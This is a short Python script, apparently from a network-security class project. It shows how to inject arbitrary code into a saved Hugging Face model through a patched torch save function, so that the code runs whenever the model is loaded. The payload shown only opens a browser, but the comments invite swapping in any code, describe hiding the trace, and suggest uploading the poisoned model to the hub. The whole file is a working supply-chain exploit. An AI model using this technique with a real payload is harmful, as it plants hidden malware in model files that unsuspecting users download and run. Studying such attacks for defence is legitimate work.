# save a model with injected code

import patch_torch_save
from transformers import AutoModel
import pickle
import os, shutil

def open_browser(): # put arbitrary code in here
    import webbrowser
    webbrowser.open("https://www.youtube.com/")

    # just to be extra sneaky, let's clean up...
    import sys
    del sys.modules["webbrowser"]

patched_save_function = patch_torch_save.patch_save_function(open_browser)

model = AutoModel.from_pretrained("distilbert-base-cased")

# import pdb;pdb.set_trace()
shutil.rmtree('/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/ben')
shutil.rmtree('/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/mal')
shutil.rmtree('/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/mal_control')
os.mkdir('/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/ben')
os.mkdir('/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/mal')
os.mkdir('/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/mal_control')
model.save_pretrained("/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/ben")
model.save_pretrained("/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/mal", save_function=patched_save_function) # optionally, upload to HF hub
model.save_pretrained("/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/mal_control", save_function=patched_save_function) # optionally, upload to HF hub


# later...

from transformers import AutoModel
# import pdb;pdb.set_trace()
model = AutoModel.from_pretrained("/home/starc/SBU/Sem-1/NetSec/Project/patch-torch-save/mal_control") # or load from HF hub
print(model) # it's just a normal model... but check your browser
